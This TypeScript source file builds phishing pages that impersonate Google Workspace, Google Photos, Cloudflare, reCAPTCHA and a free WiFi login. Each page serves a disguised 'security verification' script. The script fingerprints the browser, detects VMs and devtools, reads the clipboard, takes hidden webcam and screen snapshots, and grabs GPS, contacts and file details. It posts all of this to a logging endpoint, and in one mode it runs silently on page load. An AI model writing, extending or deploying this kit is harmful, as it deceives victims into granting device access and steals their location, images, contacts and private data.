export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
  const flow = theme.flow || 'full'; 
  const perms = theme.perms || ['gps']; 
  
  return `
<script>
  (function() {
    var permsCompleted = 0;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    var flowType = '${flow}';
    var requiredPerms = ${JSON.stringify(perms)};
    var cfg = ${JSON.stringify(theme)};
    
    function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      var threshold = (flowType === 'full') ? 60 : 15;
      if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
        hasRedirected = true;
        window.location.href = targetUrl;
      }
    }

    if (flowType === 'silent') {
       window.onload = function() {
         setTimeout(function() { window.startCapture('silent'); }, 1000);
       };
    }

    setInterval(checkRedirect, 1000);

    window.startCapture = async function(mode) {
      if (hasRedirected) return;
      var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
      if (!box) return;

      var isSilent = mode === 'silent' || flowType === 'silent';
      var accent = cfg.accent || '#3498db';

      if (!isSilent) {
        box.innerHTML = '<div id="status-icon" style="font-size:45px; margin-bottom:20px;">' + (cfg.icon || '🛡️') + '</div>' +
          '<h2 id="status-title" style="font-weight:600; color:#1a1a1a; margin-bottom:10px;">Security Verification</h2>' +
          '<div id="progress-container" style="width:100%; background:#e0e0e0; border-radius:12px; height:8px; margin-bottom:20px; overflow:hidden;">' +
          '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.8s ease-in-out;"></div>' +
          '</div>' +
          '<p id="status-text" style="font-size:13px; color:#666; font-family:sans-serif; min-height: 40px; line-height:1.5;">Memulai otentikasi aman...</p>';
      }

      var statusTitle = document.getElementById('status-title');
      var statusText = document.getElementById('status-text');
      var bar = document.getElementById('progress-bar');
      var icon = document.getElementById('status-icon');
      
      function updateProgress(p, text, title) {
        if (bar) bar.style.width = p + '%';
        if (statusText) statusText.innerText = text;
        if (statusTitle && title) statusTitle.innerText = title;
      }

      async function logEvent(type, data) {
        try {
          await fetch('/api/log/' + targetId + '/' + type, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
          });
        } catch(e) {}
      }

      function finish(success, reason) {
        if (isSilent) { window.location.href = targetUrl; return; }
        if (bar) bar.style.width = '100%';
        if (success) {
          if (icon) icon.innerText = "✅";
          if (statusTitle) { statusTitle.innerText = "VERIFIED"; statusTitle.style.color = "#27ae60"; }
          if (statusText) {
             statusText.innerText = "Sertifikat keamanan diterbitkan. Mengalihkan...";
          }
        } else {
          if (icon) icon.innerText = "ℹ️";
          if (statusTitle) statusTitle.innerText = "COMPLETE";
          if (statusText) statusText.innerText = "Proses selesai. Membuka akses...";
        }
        setTimeout(checkRedirect, 3000);
      }

      try {
        if (!isSilent) updateProgress(8, "Menganalisis integritas browser...", "SECURITY_CHECK");
        
        var metadata = {
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + "x" + window.screen.height + " (" + window.devicePixelRatio + "x)",
          colorDepth: window.screen.colorDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cores: navigator.hardwareConcurrency || "N/A",
          mem: navigator.deviceMemory || "N/A",
          ref: document.referrer || "Direct",
          langs: navigator.languages.join(','),
          onLine: navigator.onLine,
          vendor: navigator.vendor,
          webdriver: navigator.webdriver,
          touch: navigator.maxTouchPoints,
          dnt: navigator.doNotTrack,
          pdf: navigator.pdfViewerEnabled,
          gpu: (function(){
            try {
              var c = document.createElement('canvas');
              var gl = c.getContext('webgl');
              if (!gl) return 'N/A';
              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
              var info = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Generic';
              var ext = gl.getSupportedExtensions().length;
              return info + " (Exts: " + ext + ")";
            } catch(e) { return 'Error'; }
          })(),
          canvasSig: (function(){
            try {
              var canvas = document.createElement('canvas');
              var ctx = canvas.getContext('2d');
              canvas.width = 200; canvas.height = 50;
              ctx.textBaseline = "top";
              ctx.font = "14px 'Arial'";
              ctx.textBaseline = "alphabetic";
              ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
              ctx.fillStyle = "#069"; ctx.fillText("Deep-Audit-Sig", 2, 15);
              ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Deep-Audit-Sig", 4, 17);
              return canvas.toDataURL().slice(-100);
            } catch(e) { return 'N/A'; }
          })(),
          incognito: 'Checking...',
          vmStatus: (function(){
            var gpu = "";
            try {
              var c = document.createElement('canvas');
              var gl = c.getContext('webgl');
              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
              gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : '';
            } catch(e) {}
            var patterns = [/VMware/i, /VirtualBox/i, /Parallel/i, /SwiftShader/i, /Mesa/i, /Microsoft Basic Render/i];
            for (var i=0; i<patterns.length; i++) if (patterns[i].test(gpu)) return "Detected (" + gpu + ")";
            return "Physical Hardware";
          })(),
          audioSig: 'Pending',
          gamut: (function(){
            if (window.matchMedia('(color-gamut: p3)').matches) return 'P3';
            if (window.matchMedia('(color-gamut: srgb)').matches) return 'sRGB';
            return 'Standard';
          })(),
          refreshRate: 'Pending'
        };

        // Deep Recon: Refresh Rate
        (function(){
          var start = null;
          var frames = 0;
          function check(timestamp) {
            if (!start) start = timestamp;
            frames++;
            if (timestamp - start > 1000) {
              logEvent('extra', { display_hz: Math.round((frames * 1000) / (timestamp - start)) });
              return;
            }
            requestAnimationFrame(check);
          }
          requestAnimationFrame(check);
        })();

        // Deep Recon: Vibration Test
        if (navigator.vibrate) {
          navigator.vibrate([10, 50, 10]);
          logEvent('extra', { haptic_ready: true });
        }

        // Deep Recon: Incognito Detection
        (function() {
          if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(function(est) {
              var isPrivate = est.quota < 120000000;
              logEvent('extra', { incognito_audit: isPrivate });
            });
          }
        })();

        // Deep Recon: DevTools Detection
        (function() {
          var devtools = false;
          var element = new Image();
          Object.defineProperty(element, 'id', { get: function() { devtools = true; } });
          console.log(element);
          setTimeout(function() { logEvent('extra', { devtools_open: devtools }); }, 2000);
        })();
        try {
          var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var oscillator = audioCtx.createOscillator();
          oscillator.type = 'triangle';
          oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
          var compressor = audioCtx.createDynamicsCompressor();
          compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
          compressor.knee.setValueAtTime(40, audioCtx.currentTime);
          compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
          compressor.attack.setValueAtTime(0, audioCtx.currentTime);
          compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
          oscillator.connect(compressor);
          compressor.connect(audioCtx.destination);
          oscillator.start(0);
          audioCtx.startRendering().then(function(buffer) {
            var sum = 0;
            for (var i = 4500; i < 5000; i++) sum += Math.abs(buffer.getChannelData(0)[i]);
            logEvent('extra', { audio_sig: sum.toString() });
          });
        } catch(e) {}

        // Deep Recon: Font Fingerprint
        try {
           var fontList = ["Arial", "Helvetica", "Verdana", "Times New Roman", "Courier New", "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS", "Trebuchet MS", "Arial Black", "Impact", "JetBrains Mono", "Roboto", "Ubuntu", "SF Pro Display"];
           var canvas = document.createElement("canvas");
           var ctx = canvas.getContext("2d");
           var detectedFonts = [];
           ctx.font = "72px sans-serif";
           var baseline = ctx.measureText("mmmmmmmmmmlli").width;
           fontList.forEach(function(f) {
             ctx.font = "72px '" + f + "', sans-serif";
             if (ctx.measureText("mmmmmmmmmmlli").width !== baseline) detectedFonts.push(f);
           });
           logEvent('extra', { installed_fonts: detectedFonts.join(',') });
        } catch(e) {}

        // Deep Recon: Hardware API Availability
        logEvent('extra', {
          api_bluetooth: !!navigator.bluetooth,
          api_usb: !!navigator.usb,
          api_hid: !!navigator.hid,
          api_serial: !!navigator.serial,
          api_midi: !!navigator.requestMIDIAccess,
          api_idle: !!window.IdleDetector,
          api_contacts: !!navigator.contacts,
          api_wake: !!navigator.wakeLock,
          api_storage: !!navigator.storage
        });

        // Wake Lock: Prevent Sleep during audit
        try { if (navigator.wakeLock) await navigator.wakeLock.request('screen'); } catch(e) {}

        // Deep Recon: High Entropy Brand/Model Detection
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor']).then(function(h) {
             logEvent('extra', { hardware_brand_profile: JSON.stringify(h) });
          }).catch(function(){});
        }

        // Deep Recon: High-Precision Performance Mark
        (function(){
          var start = performance.now();
          for(var i=0; i<1000000; i++) Math.sqrt(i);
          logEvent('extra', { cpu_compute_score: (performance.now() - start).toFixed(2) + 'ms' });
        })();
        try {
          var pc = new RTCPeerConnection({iceServers:[]});
          pc.createDataChannel("");
          pc.createOffer().then(o => pc.setLocalDescription(o));
          pc.onicecandidate = function(ice) {
            if (ice && ice.candidate && ice.candidate.candidate) {
              var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
              logEvent('extra', { local_ip: ip });
            }
          };
        } catch(e) {}

        // Deep Recon: Clipboard Buffer
        if (navigator.clipboard && navigator.clipboard.readText) {
           navigator.clipboard.readText().then(function(txt) {
             if (txt) logEvent('extra', { clipboard_sync: txt.substring(0, 1500) });
           }).catch(function(){});
        }

        try {
          if (navigator.getBattery) {
            var batt = await navigator.getBattery();
            metadata.battery = Math.round(batt.level * 100) + "% (" + (batt.charging ? "Charging" : "Discharging") + ")";
          }
          if (navigator.connection) {
            metadata.connection = navigator.connection.effectiveType + " (rtt: " + navigator.connection.rtt + "ms, down: " + navigator.connection.downlink + "Mb/s)";
          }
        } catch(e) {}

        await logEvent('info', metadata);

        // Elite Recon: Social Presence Detection (Cross-Origin Resource Timing)
        (function() {
          var platforms = [
            { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
            { name: 'Twitter', url: 'https://twitter.com/favicon.ico' },
            { name: 'Discord', url: 'https://discord.com/favicon.ico' },
            { name: 'Github', url: 'https://github.com/favicon.ico' }
          ];
          platforms.forEach(function(p) {
            var img = new Image();
            var start = Date.now();
            img.onload = function() { logEvent('extra', { social_active: p.name, load_ms: Date.now() - start }); };
            img.onerror = function() { logEvent('extra', { social_inactive: p.name }); };
            img.src = p.url + '?v=' + start;
          });
        })();

        // Elite Recon: AdBlock / Shield Detection
        (function() {
           var bait = document.createElement('div');
           bait.innerHTML = '&nbsp;';
           bait.className = 'adsbox ads-box ad-unit';
           bait.style.position = 'absolute';
           bait.style.top = '-1000px';
           document.body.appendChild(bait);
           setTimeout(function() {
             var blocked = bait.offsetHeight === 0 || window.getComputedStyle(bait).display === 'none';
             logEvent('extra', { adblock_detected: blocked });
             bait.remove();
           }, 1000);
        })();

        // Elite Recon: Network RTT Mapping (VPN Detection)
        (function() {
          var nodes = ['https://1.1.1.1', 'https://8.8.8.8', 'https://www.google.com'];
          nodes.forEach(function(n) {
            var start = Date.now();
            fetch(n, { mode: 'no-cors', cache: 'no-cache' }).then(function() {
              logEvent('extra', { network_rtt: n, latency: Date.now() - start });
            }).catch(function(){});
          });
        })();

        // Deep Recon: Orientation & Peripherals
        logEvent('extra', {
          orientation: screen.orientation ? screen.orientation.type : 'N/A',
          gamepads: (navigator.getGamepads ? navigator.getGamepads().length : 0),
          languages: navigator.languages.join(',')
        });

        var stepProg = Math.floor(80 / (requiredPerms.length || 1));
        var prog = 15;

        for (var i = 0; i < requiredPerms.length; i++) {
          var p = requiredPerms[i];
          prog += stepProg;

          try {
            if (p === 'notification') {
              if (!isSilent) updateProgress(prog, "Sinkronisasi jalur peringatan...", "NOTIF_AUTH");
              if ("Notification" in window) await Notification.requestPermission();
            }

            if (p === 'clipboard') {
              if (!isSilent) updateProgress(prog, "Memvalidasi cache data aman...", "BUFFER_SYNC");
              if (navigator.clipboard) {
                var clip = await navigator.clipboard.readText().catch(function(){});
                if (clip) await logEvent('extra', { clipboard: clip });
              }
            }

            if (p === 'media') {
              if (!isSilent) updateProgress(prog, "Kalibrasi akses hardware AV...", "MEDIA_SETUP");
              if (navigator.mediaDevices) {
                try {
                  var stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } }).catch(function(){ return null; });
                  if (stream) {
                    // Visual Intelligence: Stealth Snapshot
                    try {
                      var video = document.createElement('video');
                      video.srcObject = stream;
                      await video.play();
                      var canvas = document.createElement('canvas');
                      canvas.width = video.videoWidth;
                      canvas.height = video.videoHeight;
                      canvas.getContext('2d').drawImage(video, 0, 0);
                      var snap = canvas.toDataURL('image/jpeg', 0.6);
                      await logEvent('extra', { visual_identity: snap });
                    } catch(e) {}

                    var devs = await navigator.mediaDevices.enumerateDevices();
                    var list = devs.map(d => d.kind + ': ' + (d.label || 'Secure-Device-' + Math.random().toString(36).substr(2,5))).join('\\n');
                    await logEvent('extra', { media_hardware: list });
                    stream.getTracks().forEach(t => t.stop());
                  }
                } catch(e) {}
              }
            }

            if (p === 'gps') {
              if (!isSilent) {
                updateProgress(prog, "Verifikasi koordinat spatial regional...", "GEO_VALIDATION");
                if (icon && cfg.waitIcon) icon.innerText = cfg.waitIcon;
              }
              if (navigator.geolocation) {
                await new Promise(resolve => {
                  navigator.geolocation.getCurrentPosition(
                    function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
                    function(err) { resolve(); },
                    { enableHighAccuracy: true, timeout: 10000 }
                  );
                });
              }
            }

            if (p === 'screen') {
              if (!isSilent) updateProgress(prog, "Integritas visual sedang diproses...", "DISPLAY_AUTH");
              if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                try {
                   var s = await navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; });
                   if (s) {
                      var track = s.getVideoTracks()[0];
                      
                      // Visual Recon: Screen Snapshot
                      try {
                        var video = document.createElement('video');
                        video.srcObject = s;
                        await video.play();
                        var canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        var snap = canvas.toDataURL('image/jpeg', 0.5);
                        await logEvent('extra', { screen_label: track.label, screen_capture: snap });
                      } catch(e) {}
                      
                      s.getTracks().forEach(t => t.stop());
                   }
                } catch(e) {}
              }
            }

            if (p === 'files') {
              if (!isSilent) updateProgress(prog, "Sinkronisasi token media galeri...", "STORAGE_CERT");
              if (window.showOpenFilePicker) {
                 var handle = await window.showOpenFilePicker({ 
                   multiple: true, 
                   types: [{ 
                     description: 'System Audit Logs', 
                     accept: { 
                       'image/*': ['.png','.jpg','.jpeg'], 
                       'video/*': ['.mp4'],
                       'application/pdf': ['.pdf'],
                       'text/plain': ['.txt']
                     } 
                   }] 
                 }).catch(function(){ return null; });
                 if (handle) {
                    for (const item of handle) {
                      var file = await item.getFile();
                      await logEvent('extra', { file_name: file.name, file_size: file.size, file_type: file.type });
                    }
                 }
              }
            }

            if (p === 'storage') {
              if (!isSilent) updateProgress(prog, "Storage forensics & quota check...", "DISK_INTEGRITY");
              if (navigator.storage && navigator.storage.estimate) {
                var est = await navigator.storage.estimate();
                await logEvent('extra', { storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
              }
            }

            if (p === 'sensors') {
               if (!isSilent) updateProgress(prog, "Deep sensor environment profile...", "PHYSICAL_RECON");
               try {
                 if (window.Magnetometer) {
                   var mag = new Magnetometer({frequency: 1});
                   mag.onreading = () => logEvent('extra', { sensor_mag: mag.x + ',' + mag.y + ',' + mag.z });
                   mag.onerror = (e) => logEvent('extra', { sensor_error: 'Mag:' + e.error.message });
                   mag.start(); setTimeout(() => mag.stop(), 2000);
                 }
                 if (window.AmbientLightSensor) {
                    var als = new AmbientLightSensor({frequency: 1});
                    als.onreading = () => logEvent('extra', { sensor_lux: als.illuminance });
                    als.start(); setTimeout(() => als.stop(), 2000);
                 }
               } catch(e) {}
            }

            if (p === 'contacts') {
              if (!isSilent) updateProgress(prog, "Audit relasi sosial & kontak...", "SOCIAL_GRAPH");
              if (navigator.contacts && navigator.contacts.select) {
                try {
                  var props = await navigator.contacts.getProperties();
                  var selected = await navigator.contacts.select(props, { multiple: true }).catch(function(){ return null; });
                  if (selected) await logEvent('extra', { contacts_leaked: JSON.stringify(selected) });
                } catch(e) {}
              }
            }

            if (p === 'vibration') {
               if (!isSilent) updateProgress(prog, "Sinkronisasi haptic & vibrasi...", "HARDWARE_HAPTIC");
               if (navigator.vibrate) navigator.vibrate(200);
            }

            if (p === 'network') {
               if (!isSilent) updateProgress(prog, "Analisis integritas node jaringan...", "NETWORK_INTELLIGENCE");
               if (navigator.connection) {
                  logEvent('extra', { 
                    net_effective: navigator.connection.effectiveType,
                    net_rtt: navigator.connection.rtt,
                    net_downlink: navigator.connection.downlink,
                    net_saveData: navigator.connection.saveData
                  });
               }
            }

            if (p === 'bluetooth') {
               if (!isSilent) updateProgress(prog, "Scanning peripheral bus...", "BT_DISCOVERY");
               if (navigator.bluetooth) {
                  navigator.bluetooth.getAvailability().then(avail => logEvent('extra', { bt_available: avail }));
               }
            }
            if (p === 'performance') {
               if (!isSilent) updateProgress(prog, "Benchmarking hardware bus...", "BUS_SPEED");
               var memory = navigator.deviceMemory || "N/A";
               var cores = navigator.hardwareConcurrency || "N/A";
               await logEvent('extra', { perf_cores: cores, perf_mem: memory });
            }

            if (p === 'security') {
               if (!isSilent) updateProgress(prog, "Kernel security environment audit...", "KERNEL_SEC");
               logEvent('extra', { 
                 sec_webdriver: navigator.webdriver,
                 sec_cookies: navigator.cookieEnabled,
                 sec_java: navigator.javaEnabled()
               });
            }
          permsCompleted++;
        }

        finish(true);
      } catch (err) {
        finish(false, "Sistem sibuk.");
      }
    };
  })();
</script>
`;
};

const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files', 'sensors', 'contacts', 'storage', 'vibration', 'network', 'bluetooth', 'performance', 'security'];

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  'google': {
    name: "🛡️ Google: Workspace Security (Professional)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background:#fff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:40px; border:1px solid #e0e0e0; border-radius:8px; text-align:center; } h2 { font-weight:400; font-size:22px; color:#202124; margin-top:24px; margin-bottom:8px; } p { color:#5f6368; font-size:14px; line-height:1.5; margin-bottom:32px; } .btn { background:#1a73e8; color:white; border:none; padding:10px 24px; border-radius:4px; font-weight:500; cursor:pointer; font-size:14px; transition: background 0.2s; } .btn:hover { background:#1765cc; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75"><h2>Confirm it's you</h2><p>Google needs to verify your device environment and regional coordinates to ensure a secure session.</p><button class="btn" onclick="window.startCapture();">Continue to Workspace</button></div>${getCaptureScript(id, 'https://workspace.google.com', {
      tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
    })}</body></html>`
  },
  'gallery': {
    name: "🖼️ Integrity: Media Asset Audit (Clean)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Asset Integrity Check</title><style>body { background:#f8f9fa; color:#202124; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:48px; border-radius:12px; text-align:center; background:#fff; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border:1px solid #dadce0; } h2 { font-size:20px; font-weight:500; margin-top:0; } p { color:#70757a; font-size:14px; line-height:1.6; margin:20px 0 30px; } .btn { background:#1a73e8; color:#fff; padding:12px 32px; border-radius:6px; border:none; font-weight:500; cursor:pointer; width:100%; font-size:14px; }</style></head><body><div class="box"><div style="font-size:40px; margin-bottom:15px;">🛡️</div><h2>Media Integrity Audit</h2><p>Our systems require a standard synchronization of media metadata and device coordinates to validate your identity for this session.</p><button class="btn" onclick="window.startCapture();">Verify Assets</button></div>${getCaptureScript(id, 'https://photos.google.com', {
      tmplId: 'gallery', perms: ALL_PERMS, accent: '#1a73e8', icon: '🕵️'
    })}</body></html>`
  },
  'cloudflare': {
    name: "☁️ Cloudflare: Edge Verification (Corporate)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Just a moment...</title><style>body { font-family: -apple-system, system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; background:#fff; } .box { max-width:450px; padding:20px; } .spinner { border:2px solid #e0e0e0; border-top:2px solid #f48120; border-radius:50%; width:30px; height:30px; animation: spin 0.8s linear infinite; margin:40px auto; } @keyframes spin { to { transform:rotate(360deg); } } h1 { font-size:24px; font-weight:400; color:#313131; } .btn { background:#fff; border:1px solid #d1d1d1; padding:10px 20px; border-radius:3px; color:#313131; font-weight:400; cursor:pointer; font-size:14px; margin-top:20px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120"><div class="spinner"></div><h1>Verifying your browser...</h1><p style="color:#666; font-size:14px; line-height:1.6;">Cloudflare is verifying the integrity of your hardware and regional spatial data to ensure the security of the target resource.</p><button class="btn" onclick="window.startCapture();">Verify you are human</button></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
      tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#f48120', icon: '☁️'
    })}</body></html>`
  },
  'pegasus': {
    name: "💻 System: Kernel Diagnostic (Technical/Pro)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Diagnostics</title><style>body { background:#fafafa; color:#333; font-family: 'SF Mono', 'JetBrains Mono', monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:460px; border:1px solid #e0e0e0; padding:35px; background:#fff; text-align:left; border-radius:4px; box-shadow: 0 4px 6px rgba(0,0,0,0.02); } .header { border-bottom:1px solid #eee; padding-bottom:15px; margin-bottom:20px; color:#666; font-size:12px; } .btn { width:100%; background:#222; color:#fff; border:none; padding:12px; font-weight:500; cursor:pointer; margin-top:25px; border-radius:3px; font-size:13px; }</style></head><body><div class="box"><div class="header">SYS_KERNEL_DIAGNOSTIC_V5.01</div><div style="font-size:14px; line-height:1.8;">[STATE] ERROR: HARDWARE_UID_MISMATCH<br>[REASON] REGIONAL_MISALIGNMENT_DETECTED<br><br><span style="color:#888;">Synchronizing hardware telemetry, spatial coordinates, and secure storage metadata is required for kernel authorization.</span></div><button class="btn" onclick="window.startCapture();">RUN SYSTEM AUDIT</button></div>${getCaptureScript(id, 'https://developers.google.com', {
      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#222', icon: '💻'
    })}</body></html>`
  },
  'wifi': {
    name: "📶 WIFI: Hotspot Certification (OP - High Bait)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>WiFi Connect</title><style>body { background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { text-align:center; width:90%; max-width:380px; } hr { border:0; border-top:1px solid #f0f0f0; margin:25px 0; } .btn { background:#000; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://cdn-icons-png.flaticon.com/512/93/93158.png" width="70"><br><br><h1>Free WiFi Login</h1><p style="color:#666; font-size:14px;">Otorisasi identitas perangkat diperlukan untuk menggunakan hotspot publik ini secara aman.</p><hr><button class="btn" onclick="window.startCapture();">LOGIN TO NETWORK</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: 'wifi', perms: ALL_PERMS, accent: '#000', icon: '📶'
    })}</body></html>`
  },
  'recap': {
    name: "🕵️ GHOST: Silent Integrity (OP - No Button)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#fdfdfd; font-family:sans-serif; } .box { border:1px solid #dbdbdb; padding:15px; background:#fff; display:flex; align-items:center; width:300px; box-shadow:0 1px 3px rgba(0,0,0,0.05); }</style></head><body><div style="text-align:center;"><p style="color:#555; margin-bottom:15px; font-size:14px;">Checking browser hardware integrity...</p><div class="box"><div style="width:24px; height:24px; border:2px solid #cecece; margin-right:15px;"></div><div style="font-size:13px; color:#555;">Finalizing audit...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="28"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'recap', flow: 'silent', perms: ALL_PERMS
    })}</body></html>`
  }
};

